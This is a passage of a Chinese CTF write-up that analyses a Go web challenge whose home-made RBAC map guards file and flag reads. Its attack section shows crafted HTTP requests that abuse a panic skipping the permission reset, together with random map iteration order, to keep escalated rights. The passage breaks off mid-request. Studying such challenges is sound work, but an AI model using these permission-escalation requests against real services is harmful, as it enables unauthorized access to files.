+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="k">if</span> <span class="nx">value</span> <span class="o">==</span> <span class="s">&#34;return&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;rbac:change_return&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="k">if</span> <span class="nx">maxDeep</span> <span class="p">&lt;</span> <span class="mi">5</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="nx">RBACToGrant</span><span class="p">[</span><span class="s">&#34;rbac:change_return:1&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">						<span class="nx">RBACToGrant</span><span class="p">[</span><span class="s">&#34;file:&#34;</span><span class="o">+</span><span class="nx">value</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">						<span class="nx">RBACToGrant</span><span class="p">[</span><span class="s">&#34;rbac:change_return:0&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">						<span class="nx">maxDeep</span> <span class="o">+=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="k">break</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="k">if</span> <span class="nx">maxDeep</span> <span class="p">&lt;</span> <span class="mi">8</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="nx">RBACToGrant</span><span class="p">[</span><span class="s">&#34;file:&#34;</span><span class="o">+</span><span class="nx">value</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">						<span class="nx">maxDeep</span><span class="o">++</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="k">break</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">updateRBAC</span><span class="p">(</span><span class="nx">RBACToGrant</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">result</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">execCommand</span><span class="p">(</span><span class="nx">execStruct</span><span class="p">.</span><span class="nx">FuncName</span><span class="p">,</span> <span class="nx">execStruct</span><span class="p">.</span><span class="nx">Param</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">response</span> <span class="p">=</span> <span class="nx">ResTemplate</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Data</span><span class="p">:</span>    <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;error&#34;</span><span class="p">:</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">()},</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">response</span> <span class="p">=</span> <span class="nx">ResTemplate</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Data</span><span class="p">:</span>    <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;result&#34;</span><span class="p">:</span> <span class="nx">result</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">initRBAC</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">})</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">r</span><span class="p">.</span><span class="nf">Run</span><span class="p">(</span><span class="s">&#34;:80&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">initRBAC</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span> <span class="p">=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">int</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;file:read&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;file:return&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;flag:read&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;flag:return&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;pwd:read&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;directory:read&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;directory:return&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;rbac:read&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;rbac:change_read&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;rbac:change_return&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">updateRBAC</span><span class="p">(</span><span class="nx">RBACToGrant</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">int</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">value</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">RBACToGrant</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">HasSuffix</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="s">&#34;:read&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;rbac:change_read&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">RBACList</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="p">=</span> <span class="nx">value</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">HasSuffix</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span> <span class="s">&#34;:return&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;rbac:change_return&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">RBACList</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="p">=</span> <span class="nx">value</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="nx">key</span> <span class="o">==</span> <span class="s">&#34;rbac:change_return:1&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;rbac:change_return&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="nx">key</span> <span class="o">==</span> <span class="s">&#34;rbac:change_return:0&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;rbac:change_return&#34;</span><span class="p">]</span> <span class="p">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">RBACList</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="p">=</span> <span class="nx">value</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">execCommand</span><span class="p">(</span><span class="nx">funcName</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">param</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="kt">string</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">funcName</span> <span class="o">==</span> <span class="s">&#34;getPwd&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;pwd:read&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">pwd</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Getwd</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">pwd</span><span class="p">,</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="s">&#34;No Permission&#34;</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="nx">funcName</span> <span class="o">==</span> <span class="s">&#34;getDirectory&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// read directory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;directory:read&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="kd">var</span> <span class="nx">fileNames</span> <span class="p">[]</span><span class="kt">string</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">err</span> <span class="o">:=</span> <span class="nx">filepath</span><span class="p">.</span><span class="nf">Walk</span><span class="p">(</span><span class="nx">param</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">path</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">info</span> <span class="nx">os</span><span class="p">.</span><span class="nx">FileInfo</span><span class="p">,</span> <span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">fileNames</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">fileNames</span><span class="p">,</span> <span class="nx">info</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">			<span class="p">})</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="s">&#34;error&#34;</span><span class="p">,</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">directoryFiles</span> <span class="o">:=</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Join</span><span class="p">(</span><span class="nx">fileNames</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;directory:return&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="nx">directoryFiles</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="s">&#34;the directory &#34;</span> <span class="o">+</span> <span class="nx">param</span> <span class="o">+</span> <span class="s">&#34; exists&#34;</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="s">&#34;No Permission&#34;</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="nx">funcName</span> <span class="o">==</span> <span class="s">&#34;getFile&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// read file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;file:read&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">param</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;flag:read&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="k">return</span> <span class="s">&#34;No Permission&#34;</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">data</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="nx">param</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="s">&#34;file:&#34;</span><span class="o">+</span><span class="nx">param</span><span class="o">+</span><span class="s">&#34; doesn&#39;t exist&#34;</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">content</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;file:return&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="s">&#34;the file &#34;</span> <span class="o">+</span> <span class="nx">param</span> <span class="o">+</span> <span class="s">&#34; exists&#34;</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;file:return&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">param</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="nx">content</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;file:return&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">param</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">RBACList</span><span class="p">[</span><span class="s">&#34;flag:return&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="nx">content</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">return</span> <span class="s">&#34;the file &#34;</span> <span class="o">+</span> <span class="nx">param</span> <span class="o">+</span> <span class="s">&#34; exists&#34;</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="s">&#34;No Permission&#34;</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="s">&#34;No such func&#34;</span><span class="p">,</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;No such func&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>关键点是 <code>initRBAC()</code>时机, 这里其实 Dir 给了不存在的目录 Walk 的时候就会直接 panic, 也不会去执行这个<code>initRBAC()</code>,也就是每次请求返回 err 或者 panic 的时候, 就会直接保留上次请求申请的权限.</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">go</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="go"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">response</span> <span class="p">=</span> <span class="nx">ResTemplate</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Data</span><span class="p">:</span>    <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;error&#34;</span><span class="p">:</span> <span class="nx">err</span><span class="p">.</span><span class="nf">Error</span><span class="p">()},</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">response</span> <span class="p">=</span> <span class="nx">ResTemplate</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">Data</span><span class="p">:</span>    <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="s">&#34;result&#34;</span><span class="p">:</span> <span class="nx">result</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="nf">initRBAC</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">c</span><span class="p">.</span><span class="nf">JSON</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="nx">response</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span></code></pre></div></div><h4 id="attack">attack</h4>
+<p>初始访问 RBAC 权限列表
+<div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250721005041.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250721005041.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>构造请求</p>
+<p><strong>请求 1</strong></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">http</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="http"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="err">POST /execSysFunc HTTP/2
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: eci-2zefjnatr5kz6ajki0cs.cloudeci1.ichunqiu.com:80
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 138
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Ch-Ua-Platform: &#34;macOS&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Language: zh-CN,zh;q=0.9
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Ch-Ua: &#34;Chromium&#34;;v=&#34;135&#34;, &#34;Not-A.Brand&#34;;v=&#34;8&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Type: application/json
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Ch-Ua-Mobile: ?0
+</span></span></span><span class="line"><span class="cl"><span class="err">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept: */*
+</span></span></span><span class="line"><span class="cl"><span class="err">Origin: https://eci-2zefjnatr5kz6ajki0cs.cloudeci1.ichunqiu.com:80
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Fetch-Site: same-origin
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Fetch-Mode: cors
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Fetch-Dest: empty
+</span></span></span><span class="line"><span class="cl"><span class="err">Referer: https://eci-2zefjnatr5kz6ajki0cs.cloudeci1.ichunqiu.com:80/
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Encoding: gzip, deflate, br
+</span></span></span><span class="line"><span class="cl"><span class="err">Priority: u=1, i
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">{&#34;File&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">&#34;read&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="err">&#34;return&#34;],&#34;Directory&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">&#34;read&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="err">&#34;return&#34;],&#34;Pwd&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">],&#34;Flag&#34;:[
+</span></span></span><span class="line"><span class="cl"><span class="err">&#34;read&#34;],&#34;FuncName&#34;:&#34;getDirectory&#34;,&#34;Param&#34;:&#34;/tmp/zxx&#34;}
+</span></span></span></code></pre></div></div><p>这里注意一下,由于<code>for range</code>遍历 map 的时候, 顺序不是塞进去的顺序, 打个 log 就能发现, 这里实际上是先设置<code>rbac:change_return:0</code>为 1, 后设置<code>rbac:change_return:1 : 1</code>, 而我们触发了 panic, 之后随便设置 return 都可以了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">current kv: file:return : 1
+</span></span><span class="line"><span class="cl">current kv: rbac:change_return:0 : 1
+</span></span><span class="line"><span class="cl">current kv: directory:read : 1
+</span></span><span class="line"><span class="cl">current kv: flag:read : 1
+</span></span><span class="line"><span class="cl">current kv: file:read : 1
+</span></span><span class="line"><span class="cl">current kv: rbac:change_return:1 : 1
+</span></span></code></pre></div></div><p>简单来说, 就是第一次让<code>rbac:change_return:1</code> 在 <code>rbac:change_return:0</code> 后面被遍历, 这样在 err 或者 panic 的情况下 <code>rbac:change_return</code>的值就永远是 1 了</p>
+<p><strong>请求 2</strong></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">http</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="http"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="err">POST /execSysFunc HTTP/2
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: eci-2zefjnatr5kz6ajki0cs.cloudeci1.ichunqiu.com:80
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 116
+</span></span></span><span class="line"><span class="cl"><span class="err">Sec-Ch-Ua-Platform: &#34;macOS&#34;
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Language: zh-CN,zh;q=0.9
